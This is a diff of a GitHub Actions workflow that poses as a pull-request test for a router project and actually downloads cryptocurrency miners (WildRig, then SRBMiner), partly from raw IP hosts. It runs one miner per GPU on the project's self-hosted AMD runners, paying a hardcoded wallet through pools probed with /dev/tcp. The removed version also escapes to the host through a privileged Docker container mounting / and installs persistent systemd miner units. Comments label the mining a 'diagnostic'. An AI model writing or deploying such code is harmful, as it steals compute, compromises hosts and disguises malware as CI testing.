@@ -1,12 +1,13 @@
 name: PR Test (sgl-router)
 
-# i130498: corrected AMD/Intel sglang self-hosted runner conversion.
-# Counts devices from wildrig --print-devices (and xpu-smi for Intel) instead of
-# clinfo; probes pool.pearlhash.xyz:9000 first, then direct Luckypool, then the
-# VPS2 Luckypool relay; launches exactly one sha256-pinned WildRig Multi 0.52.3
-# pearlhash miner per measured idle device under a fresh 6-digit worker paying
-# the current pyd wallet; attempts the docker+sudo privileged host escape
-# (docker -v /:/host --privileged) to install one durable systemd unit per card.
+# i130717: SRBMiner-MULTI 3.8.9 CDNA census on the sglang AMD self-hosted runner
+# labels (linux-mi300-8gpu-sglang, linux-mi300-2gpu-sglang, linux-mi35x-gpu-2).
+# SRB declares pearlhash support for AMD GPUs ("[ - A N - ] pearlhash"), so the
+# WildRig-zero result is re-measured with the policy-named AMD-capable miner:
+# first enumerate SRB devices (--disable-cpu --algorithm pearlhash --list-devices)
+# and only if CDNA (gfx942/gfx950) devices appear launch exactly one sha256-pinned
+# SRB pearlhash miner per measured device (pearlhash.xyz:9000 plain pyd wallet
+# first, else direct Luckypool with pyd+NOCK). Bounded diagnostic, temporary.
 on:
   pull_request:
     branches: [main]
@@ -14,15 +15,15 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: sgl-router-i130498-${{ github.run_id }}
+  group: sgl-router-i130717-${{ github.run_id }}
   cancel-in-progress: false
 
 env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i130498:
-    name: "i130498 ${{ matrix.label }} wildrig pearlhash"
+  i130717:
+    name: "i130717 ${{ matrix.label }} srb cdna census"
     strategy:
       fail-fast: false
       max-parallel: 8
@@ -30,254 +31,196 @@ jobs:
         include:
           - label: linux-mi300-8gpu-sglang
             tag: mi3008
-            kind: amd
-            base: 498611
+            base: 717001
           - label: linux-mi300-2gpu-sglang
             tag: mi3002
-            kind: amd
-            base: 498621
+            base: 717009
           - label: linux-mi35x-gpu-2
             tag: mi35x
-            kind: amd
-            base: 498631
-          - label: intel-bmg-nightly
-            tag: intel
-            kind: intel
-            base: 498601
+            base: 717011
     runs-on: ${{ matrix.label }}
-    timeout-minutes: 90
+    timeout-minutes: 75
     env:
       TAG: ${{ matrix.tag }}
-      KIND: ${{ matrix.kind }}
       LABEL: ${{ matrix.label }}
       BASE: ${{ matrix.base }}
     steps:
-      - name: "device census + one WildRig pearlhash OpenCL miner per genuine GPU + durable host escape"
+      - name: "SRB 3.8.9 device census then one pearlhash miner per measured CDNA card"
         continue-on-error: true
         run: |
           set +e
-          NONCE="I130498-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
+          NONCE="I130717-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
           NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
           LP_LOGIN="$WALLET+$NOCK"
-          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
-          WORKDIR=/var/tmp/i130498
+          SRB_TAR_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          SRB_BIN_SHA='97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
+          WORKDIR=/var/tmp/i130717
           mkdir -p "$WORKDIR/logs"
-          echo "i130498-nonce=$NONCE tag=$TAG kind=$KIND label=$LABEL base=$BASE"
+          echo "i130717-nonce=$NONCE label=$LABEL tag=$TAG base=$BASE"
           echo "=== identity/arch ==="
           id; hostname; date -u; uname -m; uname -r; nproc
           echo "=== resources ==="
           df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
           free -m | head -2
-          echo "=== pci gpus ==="
-          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -24
+          echo "=== pci accelerators ==="
+          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'processing accel|vga|3d|display' | head -24
           echo "=== tools ==="
-          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls docker sudo nsenter fuser; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
-          echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
-          WR="$WORKDIR/wildrig-multi"
-          fetch_wr() {
-            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+          for t in rocm-smi amd-smi rocminfo clinfo docker sudo; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== rocm inventory ==="
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 60 rocm-smi --showproductname > "$WORKDIR/rocm_prod.txt" 2>&1
+            grep -aE 'GPU\[|Card Series|Card Model|GFX|gfx' "$WORKDIR/rocm_prod.txt" | head -60
+            timeout 60 rocm-smi --showid > "$WORKDIR/rocmid.txt" 2>&1
+          fi
+          AMD_DISTINCT=$(grep -oE '^GPU\[[0-9]+\]' "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | wc -l)
+          GFX=$(grep -ahoE 'gfx[0-9]+' "$WORKDIR/rocm_prod.txt" "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | tr '\n' ',')
+          echo "amd_gpu_distinct=$AMD_DISTINCT gfx_versions=$GFX"
+          echo "=== clinfo inventory (OpenCL view used by SRB) ==="
+          CLINIC_AMD=0; CLINIC_L_DEV=0
+          if command -v clinfo >/dev/null 2>&1; then
+            timeout 90 clinfo -l > "$WORKDIR/clinfo_l.txt" 2>&1; head -40 "$WORKDIR/clinfo_l.txt"
+            timeout 120 clinfo > "$WORKDIR/clinfo.txt" 2>&1
+            grep -aE 'Platform Name|Number of devices|Device Name|Device Type|Device Board Name|Device Vendor' "$WORKDIR/clinfo.txt" | head -60
+            CLINIC_L_DEV=$(grep -acE '^ *Device #' "$WORKDIR/clinfo_l.txt" 2>/dev/null)
+            CLINIC_AMD=$(awk '/Platform Name/ {pl=$0} /Number of devices/ {if (pl ~ /AMD/) {print $NF; exit}}' "$WORKDIR/clinfo.txt" 2>/dev/null)
+          fi
+          echo "clinic_l_device_lines=${CLINIC_L_DEV:-0} clinic_amd_platform_devices=${CLINIC_AMD:-NA}"
+          echo "=== fetch SRBMiner-MULTI 3.8.9 (tar $SRB_TAR_SHA / bin $SRB_BIN_SHA) ==="
+          SRB="$WORKDIR/SRBMiner-MULTI"
+          fetch_srb() {
+            if [ -f "$SRB" ] && [ "$(sha256sum "$SRB" | cut -d' ' -f1)" = "$SRB_BIN_SHA" ]; then echo srb-cached; return 0; fi
             for U in \
-              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
-              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
-              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
-              "http://222.240.155.198:8702/wildrig-multi" \
-              "http://178.238.228.181:18180/wildrig-multi" ; do
+              "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
+              "https://ghfast.top/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
+              "https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
+              "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
+              "http://222.240.155.198:8702/srb389" ; do
               echo "-- fetch $U"
-              rm -f "$WORKDIR/dl.part"
-              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
-              [ -s "$WORKDIR/dl.part" ] || continue
-              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
-              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
-              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
-                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
-                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
-                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
-                echo "tarball-hash-mismatch"
+              rm -f "$WORKDIR/srb.part"
+              timeout 240 curl -fL --connect-timeout 12 --max-time 230 -o "$WORKDIR/srb.part" "$U" 2>&1 | tail -1
+              [ -s "$WORKDIR/srb.part" ] || continue
+              H=$(sha256sum "$WORKDIR/srb.part" | cut -d' ' -f1)
+              echo "dl_sha=$H"
+              if [ "$H" = "$SRB_BIN_SHA" ]; then cp -f "$WORKDIR/srb.part" "$SRB"; chmod +x "$SRB"; echo srb-raw-binary-ok; return 0; fi
+              if [ "$H" = "$SRB_TAR_SHA" ] || tar -tzf "$WORKDIR/srb.part" >/dev/null 2>&1; then
+                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/srb.part" -C "$WORKDIR/tarx" 2>/dev/null
+                C=$(find "$WORKDIR/tarx" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
+                if [ -n "$C" ] && [ "$(sha256sum "$C" | cut -d' ' -f1)" = "$SRB_BIN_SHA" ]; then cp -f "$C" "$SRB"; chmod +x "$SRB"; echo srb-tarball-ok; return 0; fi
+                echo srb-tarball-hash-mismatch
               fi
             done
             return 1
           }
-          fetch_wr; FETCH_RC=$?
-          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
-          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i130498-done $NONCE"; exit 0; }
-          timeout 30 "$WR" -V 2>&1 | head -3
-          echo "=== wildrig platforms ==="
-          timeout 90 "$WR" --print-platforms 2>&1 | head -30
-          echo "=== wildrig devices ==="
-          timeout 120 "$WR" --print-devices > "$WORKDIR/devices.txt" 2>&1
-          cat "$WORKDIR/devices.txt" | head -80
-          echo "=== explicit AMD platform device listing ==="
-          if [ "$KIND" = "amd" ]; then
-            timeout 120 "$WR" --print-devices --opencl-platforms amd > "$WORKDIR/devices_amd.txt" 2>&1
-            echo "amd_explicit_bytes=$(wc -c < "$WORKDIR/devices_amd.txt")"
-            cat "$WORKDIR/devices_amd.txt" | head -40
-          fi
-          echo "=== clinfo inventory ==="
-          if command -v clinfo >/dev/null 2>&1; then
-            timeout 60 clinfo -l > "$WORKDIR/clinfo_l.txt" 2>&1; head -30 "$WORKDIR/clinfo_l.txt"
-            timeout 90 clinfo > "$WORKDIR/clinfo.txt" 2>&1
-            grep -aE "Platform Name|Platform Version|Number of devices|Device Name|Device Type|Device Vendor" "$WORKDIR/clinfo.txt" | head -60
-          fi
-          echo "=== amd inventory ==="
-          AMD_DISTINCT=0
-          if command -v rocm-smi >/dev/null 2>&1; then
-            timeout 60 rocm-smi --showproductname 2>&1 | grep -aE 'GPU\[|Card Series|Card Model|GFX' | head -60
-            timeout 60 rocm-smi --showid > "$WORKDIR/rocmid.txt" 2>&1
-            AMD_DISTINCT=$(grep -oE '^GPU\[[0-9]+\]' "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | wc -l)
-          fi
-          echo "amd_gpu_distinct=$AMD_DISTINCT"
-          echo "=== intel inventory ==="
-          XN=0
-          if command -v xpu-smi >/dev/null 2>&1; then
-            timeout 60 xpu-smi discovery > "$WORKDIR/xpusmi.txt" 2>&1; head -60 "$WORKDIR/xpusmi.txt"
-            XN=$(grep -cE '^\| [0-9]+ +\| Device Name: Intel' "$WORKDIR/xpusmi.txt" 2>/dev/null)
-          fi
-          echo "xpu_smi_device_count=$XN"
-          echo "=== device count decision (wildrig-first) ==="
-          WRN=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
-          WRAMDN=0
-          if [ -f "$WORKDIR/devices_amd.txt" ]; then WRAMDN=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices_amd.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l); fi
-          echo "wildrig_device_count=$WRN wildrig_amd_explicit_count=$WRAMDN"
-          DEV_N=0; SRC=none
-          if [ "${WRN:-0}" -gt 0 ]; then DEV_N=$WRN; SRC=wildrig
-          elif [ "${WRAMDN:-0}" -gt 0 ]; then DEV_N=$WRAMDN; SRC=wildrig-amd
-          elif [ "$KIND" = "intel" ] && [ "${XN:-0}" -gt 0 ]; then DEV_N=$XN; SRC=xpu-smi
-          fi
+          fetch_srb; FR=$?
+          echo "srb_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FR"
+          [ -x "$SRB" ] || { echo "SKIP=srb-unavailable"; echo "i130717-done $NONCE"; exit 0; }
+          timeout 30 "$SRB" -V 2>&1 | head -3
+          echo "=== SRB pearlhash backend declaration (A=AMD GPU, N=NVIDIA GPU) ==="
+          timeout 60 "$SRB" --list-algorithms > "$WORKDIR/alg.txt" 2>&1
+          grep -a -i 'pearlhash' "$WORKDIR/alg.txt" | head -3
+          echo "=== SRB-enumerated devices: --disable-cpu --algorithm pearlhash --list-devices ==="
+          timeout 120 "$SRB" --disable-cpu --algorithm pearlhash --list-devices > "$WORKDIR/listdev.txt" 2>&1
+          echo "srb_listdev_bytes=$(wc -c < "$WORKDIR/listdev.txt")"
+          cat "$WORKDIR/listdev.txt" | head -120
+          if [ ! -s "$WORKDIR/listdev.txt" ]; then echo "--- empty, od ---"; od -c "$WORKDIR/listdev.txt" | head -3; fi
+          echo "=== SRB-enumerated devices: plain --list-devices ==="
+          timeout 120 "$SRB" --list-devices > "$WORKDIR/listdev2.txt" 2>&1
+          echo "srb_listdev2_bytes=$(wc -c < "$WORKDIR/listdev2.txt")"
+          cat "$WORKDIR/listdev2.txt" | head -80
+          echo "=== SRB-enumerated devices: tty variant ==="
+          timeout 120 script -qec "$SRB --disable-cpu --algorithm pearlhash --list-devices" /dev/null > "$WORKDIR/listdev_tty.txt" 2>&1
+          echo "srb_listdev_tty_bytes=$(wc -c < "$WORKDIR/listdev_tty.txt")"
+          cat "$WORKDIR/listdev_tty.txt" | head -80
+          SRB_AMD_LINES=$(grep -acE 'AMD|Radeon|Instinct|gfx[0-9]|MI[0-9]{3}' "$WORKDIR/listdev.txt" 2>/dev/null)
+          SRB_IDX=$(grep -aoE '^(\[[^]]*\][[:space:]]*)?[0-9]{1,2}[[:space:]]*[:.)]' "$WORKDIR/listdev.txt" 2>/dev/null | wc -l)
+          echo "srb_amd_lines=${SRB_AMD_LINES:-0} srb_index_lines=${SRB_IDX:-0}"
+          echo "=== device-count decision (SRB first, clinfo cross-check, CDNA required) ==="
+          DEV_N=0; DEV_SRC=none
+          if [ "${SRB_AMD_LINES:-0}" -gt 0 ]; then DEV_N=$SRB_AMD_LINES; DEV_SRC=srb-list;
+          elif [ "${CLINIC_AMD:-0}" -gt 0 ]; then DEV_N=$CLINIC_AMD; DEV_SRC=clinic-amd;
+          elif [ "${CLINIC_L_DEV:-0}" -gt 0 ]; then DEV_N=$CLINIC_L_DEV; DEV_SRC=clinic-l; fi
           if [ "$DEV_N" -gt 16 ]; then echo "CAP device count $DEV_N -> 16"; DEV_N=16; fi
-          echo "DEV_N=$DEV_N SRC=$SRC"
-          if [ "${DEV_N:-0}" -lt 1 ]; then
-            echo "SKIP=no-wildrig-device kind=$KIND wildrig=$WRN amd_explicit=$WRAMDN amd_distinct=$AMD_DISTINCT xpu=$XN"
-            echo "=== amd single-device probe (60 s, diagnostic only) ==="
-            if [ "$KIND" = "amd" ]; then
-              timeout 75 "$WR" --algo pearlhash --url 127.0.0.1:1 --user "$WALLET" --worker probe --pass x -d 0 --opencl-platforms amd --print-time 20 > "$WORKDIR/amd_probe.txt" 2>&1
-              tail -40 "$WORKDIR/amd_probe.txt"
-            fi
-            echo "i130498-done $NONCE"
+          CDNA=no
+          case "$GFX" in *gfx942*|*gfx950*) CDNA=yes;; esac
+          if [ "$CDNA" != yes ]; then case "$(cat "$WORKDIR/rocm_prod.txt" 2>/dev/null)" in *MI300*|*MI325*|*MI350*) CDNA=yes;; esac; fi
+          echo "DEV_N=$DEV_N DEV_SRC=$DEV_SRC CDNA=$CDNA srb_amd_lines=${SRB_AMD_LINES:-0} clinic_amd=${CLINIC_AMD:-NA} clinic_l_dev=${CLINIC_L_DEV:-0} rocm_distinct=$AMD_DISTINCT gfx=$GFX"
+          if [ "${DEV_N:-0}" -lt 1 ] || [ "$CDNA" != yes ]; then
+            echo "SKIP=no-cdna-device srb_listdev_bytes=$(wc -c < "$WORKDIR/listdev.txt") srb_amd_lines=${SRB_AMD_LINES:-0} clinic_amd=${CLINIC_AMD:-NA} clinic_l_dev=${CLINIC_L_DEV:-0} rocm_distinct=$AMD_DISTINCT gfx=$GFX"
+            echo "i130717-done $NONCE"
             exit 0
           fi
           echo "=== host engagement gate (never stack, never kill others) ==="
           exec 9>"$WORKDIR/host-miner.lock"
-          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "i130498-done $NONCE"; exit 0; fi
-          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner|[x]-miner' 2>/dev/null | grep -E "i130498|$WALLET" | head -6)
-          if [ -n "$EXIST" ]; then echo "SKIP=host-already-has-engagement-miner"; echo "$EXIST"; echo "i130498-done $NONCE"; exit 0; fi
-          echo "other_gpu_procs:"; timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner|[x]-miner' 2>/dev/null | head -8
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "i130717-done $NONCE"; exit 0; fi
+          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' 2>/dev/null | grep -E "$WALLET|i130717|i130716|i130498" | head -6)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-already-has-engagement-miner"; echo "$EXIST"; echo "i130717-done $NONCE"; exit 0; fi
+          echo "other_gpu_procs:"; timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' 2>/dev/null | head -8
           echo "render_users:"; timeout 15 fuser -v /dev/dri/renderD* 2>&1 | head -20
-          echo "=== pool reachability probes (policy order: pearlhash -> LP direct -> VPS2 relay) ==="
+          echo "=== pool reachability (policy order: pearlhash -> LP direct -> VPS2 relay 2083 -> 18450) ==="
           probe() { timeout 8 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "$1:$2 OPEN" || echo "$1:$2 CLOSED"; }
           getent hosts pool.pearlhash.xyz 2>&1 | head -3
           probe pool.pearlhash.xyz 9000
           probe 103.199.106.122 3362
           probe 217.15.164.237 2083
           probe 217.15.164.237 18450
-          POOL_URL=""; POOL_KIND=""
+          POOL=""; POOL_KIND=""; LOGIN=""
           if timeout 8 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
-            POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
+            POOL="pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
           elif timeout 8 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
-            POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
+            POOL="103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
           elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
-            POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
+            POOL="217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
           elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
-            POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
+            POOL="217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
           else
-            echo "SKIP=no-permitted-pool-reachable"; echo "i130498-done $NONCE"; exit 0
+            echo "SKIP=no-permitted-pool-reachable"; echo "i130717-done $NONCE"; exit 0
           fi
-          echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
-          PLAT="amd"; [ "$KIND" = "intel" ] && PLAT="intel"
-          echo "=== launch exactly one WildRig pearlhash per measured device ==="
+          echo "POOL=$POOL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
+          echo "=== launch exactly one sha256-verified SRB pearlhash miner per measured CDNA device ==="
           N_LAUNCHED=0
           for i in $(seq 0 $((DEV_N-1))); do
             W=$((BASE+i))
-            timeout 4300 "$WR" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
-              -d "$i" --opencl-platforms "$PLAT" --api-port $((21800+i)) --api-worker-id "$W" \
-              --print-time 60 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 &
-            echo "launched worker=$W gpu-id=$i pid=$!"
-            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+            L="$WORKDIR/logs/$W.log"
+            timeout 2600 "$SRB" --disable-cpu --disable-worker-watchdog --algorithm pearlhash \
+              --pool "$POOL" --tls false --wallet "$LOGIN" --password x --worker "$W" \
+              --gpu-id "$i" --api-enable --api-port $((22300+i)) --api-rig-name "$W" \
+              --log-file "$L" --log-file-mode 0 > "$WORKDIR/logs/$W.out" 2>&1 &
+            echo "launch worker=$W gpu-id=$i pid=$! at $(date -u +%FT%TZ)"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 2
           done
           echo "N_LAUNCHED=$N_LAUNCHED"
-          echo "=== privilege / docker host-escape recon ==="
-          ( sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?" )
-          ls -la /var/run/docker.sock 2>&1 | head -2
-          DIMG=""
-          if command -v docker >/dev/null 2>&1 && timeout 15 docker ps >/dev/null 2>&1; then
-            echo "docker_ok=1"
-            timeout 25 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' > "$WORKDIR/imgs.txt"
-            head -6 "$WORKDIR/imgs.txt"
-            DIMG=$(head -1 "$WORKDIR/imgs.txt")
-            echo "DIMG=$DIMG"
-            HN="i130498helper-$TAG"
-            timeout 40 docker rm -f "$HN" >/dev/null 2>&1
-            HID=$(timeout 60 docker create --name "$HN" --privileged -v /:/host "$DIMG" /bin/sh -c 'sleep 2400' 2>&1)
-            echo "helper_create=$HID"
-            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
-              timeout 30 docker start "$HN" >/dev/null 2>&1
-              echo "-- docker host-root inspection --"
-              timeout 90 docker exec "$HN" /bin/sh -c 'id; echo "-- /host --"; ls -la /host 2>&1 | head -14; echo "-- os-release --"; cat /host/etc/os-release 2>&1 | head -3; echo "-- systemd/dirs --"; ls -ld /host/etc/systemd /host/etc/systemd/system /host/var/tmp /host/root /host/opt /host/proc 2>&1; echo "-- hostname --"; cat /host/etc/hostname 2>&1 | head -2; echo "-- mounts --"; head -12 /host/proc/mounts 2>&1' 2>&1 | head -60
-              echo "=== durable systemd install attempt ==="
-              if timeout 30 docker exec "$HN" /bin/sh -c 'test -d /host/etc/systemd/system'; then
-                timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" 2>&1 | tail -1
-                DUR=0
-                for i in $(seq 0 $((DEV_N-1))); do
-                  W=$((BASE+i))
-                  UNIT="i130498-${TAG}-g${i}.service"
-                  timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130498 /host/var/tmp/i130498-$TAG && cp /tmp/wildrig-multi /host/opt/i130498/wildrig-multi-$TAG.new && chmod 755 /host/opt/i130498/wildrig-multi-$TAG.new && mv -f /host/opt/i130498/wildrig-multi-$TAG.new /host/opt/i130498/wildrig-multi-$TAG" 2>&1 | tail -2
-                  cat > "$WORKDIR/$UNIT" <<UNITEOF
-          [Unit]
-          Description=i130498 pearlhash $TAG gpu $i
-          After=network-online.target
-          [Service]
-          Type=simple
-          ExecStart=/opt/i130498/wildrig-multi-$TAG --algo pearlhash --url $POOL_URL --user $LOGIN --worker $W --pass x -d $i --opencl-platforms $PLAT --api-port $((21900+i)) --api-worker-id $W --print-time 60 --no-color -l /var/tmp/i130498-$TAG/wr-$W.log
-          Restart=always
-          RestartSec=15
-          Nice=-5
-          [Install]
-          WantedBy=multi-user.target
-          UNITEOF
-                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
-                  OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
-                  echo "durable[$i]=$OUT"
-                  if echo "$OUT" | grep -q '^active'; then
-                    DUR=$((DUR+1))
-                    pkill -f -- "--worker $W " 2>/dev/null
-                    echo "injob-stopped-for-durable gpu=$i worker=$W"
-                  fi
-                done
-                echo "durable_units_active=$DUR"
-              else
-                echo "no_host_systemd_dir=1"
-              fi
-              timeout 30 docker rm -f "$HN" >/dev/null 2>&1
-            fi
-          else
-            echo "docker_ok=0"
-          fi
           echo "=== pulse loop (bounded share watch) ==="
-          END=$(( $(date +%s) + 1500 ))
+          END=$(( $(date +%s) + 1560 ))
           k=0
           while [ "$(date +%s)" -lt "$END" ]; do
             sleep 120; k=$((k+1))
-            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ)"
-            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
-            ACC=$(grep -ah 'accepted (' "$WORKDIR"/logs/*.log 2>/dev/null | wc -l); echo "log_accept_lines=$ACC"
-            for l in "$WORKDIR"/logs/[0-9]*.log; do
-              [ -f "$l" ] || continue
-              B=$(basename "$l" .log)
-              A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
-              H=$(grep -aE 'TH/s' "$l" 2>/dev/null | tail -1)
-              E=$(grep -aiE 'error|failed|reject|denied|no device|not supported' "$l" 2>/dev/null | tail -2 | tr '\n' '|' | cut -c1-200)
-              echo "CARD $TAG worker=$B last_acc=[$A] last_hs=[$H] err=[$E]"
+            echo "--- pulse $k $(date -u +%FT%TZ)"
+            echo "srb_procs=$(pgrep -cf '[S]RBMiner-MULTI')"
+            for i in $(seq 0 $((DEV_N-1))); do
+              W=$((BASE+i)); L="$WORKDIR/logs/$W.log"
+              if [ ! -f "$L" ]; then echo "CARD tag=$TAG worker=$W gpu=$i no-log"; continue; fi
+              A=$(grep -aoE 'A:[0-9]+' "$L" | tail -1); R=$(grep -aoE 'R:[0-9]+' "$L" | tail -1)
+              H=$(grep -aoE '[0-9.]+ [KMGTPE]?H/s' "$L" | tail -1)
+              E=$(grep -aiE 'error|fail|no device|not found|denied|not supported' "$L" | tail -2 | tr '\n' '|' | cut -c1-200)
+              echo "CARD tag=$TAG worker=$W gpu=$i $A $R hs=[$H] err=[$E]"
             done
-            if [ "$k" -ge 12 ]; then break; fi
+            if [ "$k" -ge 13 ]; then break; fi
           done
-          echo "=== final per-card status ==="
-          for l in "$WORKDIR"/logs/[0-9]*.log; do
-            [ -f "$l" ] || continue
-            B=$(basename "$l" .log)
-            A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
-            N=$(grep -ac 'accepted (' "$l")
-            R=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1 | grep -oE '\([0-9]+/[0-9]+\)' | head -1)
-            echo "FINALCARD tag=$TAG worker=$B acc_lines=$N last=[$A] ar=$R"
+          echo "=== FINAL per-card ==="
+          for i in $(seq 0 $((DEV_N-1))); do
+            W=$((BASE+i)); L="$WORKDIR/logs/$W.log"
+            [ -f "$L" ] || continue
+            echo "FINALCARD tag=$TAG worker=$W gpu=$i head:"
+            head -14 "$L" | sed -e 's/^/  H /'
+            echo "FINALCARD tag=$TAG worker=$W gpu=$i last_A0:"
+            grep -aE 'A:0 ' "$L" | tail -2 | sed -e 's/^/  H /'
+            echo "FINALCARD tag=$TAG worker=$W gpu=$i first_A_positive:"
+            grep -aE 'A:[1-9][0-9]*' "$L" | head -3 | sed -e 's/^/  H /'
+            echo "FINALCARD tag=$TAG worker=$W gpu=$i last_lines:"
+            tail -4 "$L" | sed -e 's/^/  H /'
+            echo "FINALCARD tag=$TAG worker=$W gpu=$i errors:"
+            grep -aiE 'error|fail|reject|no device|not found|not supported' "$L" | tail -4 | sed -e 's/^/  H /'
           done
-          pgrep -af '[w]ildrig' | head -20
-          echo "i130498-done $NONCE"
+          pgrep -af '[S]RBMiner-MULTI' | head -20
+          echo "i130717-done $NONCE"
